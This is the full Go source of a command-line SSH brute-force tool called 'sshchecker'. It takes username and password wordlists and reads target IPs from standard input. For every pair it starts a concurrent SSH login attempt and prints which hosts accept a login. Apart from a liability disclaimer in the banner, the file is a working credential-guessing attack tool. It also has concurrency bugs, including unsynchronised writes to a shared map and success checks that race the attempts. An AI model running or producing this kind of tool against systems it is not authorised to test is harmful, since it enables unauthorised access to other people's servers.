package main

import (
	"bufio"
	"flag"
	"fmt"
	"os"

	"github.com/projectdiscovery/gologger"
	"github.com/scottkiss/gosshtool"
)

const banner = `
              __         __              __            
   __________/ /_  _____/ /_  ___  _____/ /_____  _____
  / ___/ ___/ __ \/ ___/ __ \/ _ \/ ___/ //_/ _ \/ ___/
 (__  |__  ) / / / /__/ / / /  __/ /__/ ,< /  __/ /    
/____/____/_/ /_/\___/_/ /_/\___/\___/_/|_|\___/_/v1.0     
`
const Version = `1.0`

func showBanner() {
	gologger.Printf("%s\n", banner)
	gologger.Printf("\t\tCreated by Shazeb.\n\n")

	gologger.Labelf("Use with caution. You are responsible for your actions\n")
	gologger.Labelf("Developers assume no liability and are not responsible for any misuse or damage.\n\n")
}

var (
	userList      string
	passwordList  string
	concurrency   int
	ShowVer       bool
	userlistSlice []string
	passwordSlice []string
	ipStatus      map[string]bool
	Verbose       bool
)

func ParseOptions() {

	flag.StringVar(&userList, "U", "", "Text file containing list of usernames to use")
	flag.StringVar(&passwordList, "P", "", "Text file containing list of passwords to use")
	flag.BoolVar(&ShowVer, "version", false, "Show current program version")
	//flag.IntVar(&concurrency, "c", 10, "set the concurrency level")
	flag.BoolVar(&Verbose, "v", false, "Show Verbose output.")
	flag.Parse()

}

func main() {
	userlistSlice := make([]string, 0)
	passwordSlice := make([]string, 0)
	ParseOptions()
	showBanner()
	if ShowVer {
		gologger.Infof("Current Version: %s\n", Version)
		os.Exit(0)
	}

	//var wg sync.WaitGroup

	//To Read the flag userlist
	userlistSlice = reader(userList)
	//To read the flag passwordlist
	passwordSlice = reader(passwordList)
	ipStatus = make(map[string]bool)

	//adding scanner for reading the input from terminal
	sc := bufio.NewScanner(os.Stdin)

	for sc.Scan() {
		text := sc.Text()
		fmt.Printf("Bruteforcing on %v\n", text)
		for _, usr := range userlistSlice {
			if ipStatus[text] == true {
				fmt.Printf("Success Login on \n%v", text)
				break
			} else {
				for _, pwd := range passwordSlice {
					go bruteforce(text, usr, pwd)
					if Verbose == true {
						fmt.Printf("[+]Trying ssh login on %v = %v:%v\n", text, usr, pwd)

					}
				}
			}
		}
	}
}

func bruteforce(ip, user string, pass string) {
	//fmt.Println(pass)
	//fmt.Printf("Trying sshing on: %v with user: %s\n", ip, user)
	sshlogin(user, ip, pass)
}

//[TODO] Reading text function.
func reader(text string) []string {
	emptyArray := make([]string, 0)
	f, err := os.Open(text)
	if err != nil {
		emptyArray = append(emptyArray, "error occured")
		return emptyArray
	}
	index := 0
	sc := bufio.NewScanner(f)
	for sc.Scan() {
		text := sc.Text()
		emptyArray = append(emptyArray, text)
		index++
	}
	return emptyArray
}

func sshlogin(user, ip, pass string) {

	sshconfig := &gosshtool.SSHClientConfig{
		User:     user,
		Password: pass,
		Host:     ip,
	}
	sshclient := gosshtool.NewSSHClient(sshconfig)
	_, err := sshclient.Connect()
	if err == nil {
		fmt.Println("[+]ssh successful")
		ipStatus[ip] = true
	}

}
